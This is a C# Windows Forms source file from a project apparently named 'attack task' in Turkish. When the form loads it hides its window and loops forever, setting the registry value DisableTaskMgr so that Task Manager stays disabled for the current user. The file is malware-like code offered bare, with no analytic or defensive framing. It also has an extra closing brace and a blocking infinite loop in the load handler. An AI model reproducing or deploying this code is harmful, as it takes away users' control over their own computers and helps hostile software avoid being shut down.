using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AtakGorevY
{
    public partial class a : Form
    {
        public a()
        {
            InitializeComponent();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            while (true)
            {
                this.Hide();
                try
                {
                    RegistryKey rkey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    string Durum = rkey.GetValue("DisableTaskMgr").ToString();
                    if (Durum == "0")
                    {
                        RegistryKey rkey1 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies", true);
                        rkey1.CreateSubKey("System", RegistryKeyPermissionCheck.Default);
                        rkey1.Close();
                        RegistryKey rkey2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                        rkey2.SetValue("DisableTaskMgr", 1);
                        rkey2.Close();
                    }
                    else if (Durum == "1")
                    {

                    }
                    else
                    {

                        RegistryKey rkey1 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies", true);
                        rkey1.CreateSubKey("System", RegistryKeyPermissionCheck.Default);
                        rkey1.Close();
                        RegistryKey rkey2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                        rkey2.SetValue("DisableTaskMgr", 1);
                        rkey2.Close();
                    }
                }
                catch (Exception h) { MessageBox.Show(h.Message); }
            }
          
        }
        }
    }
}

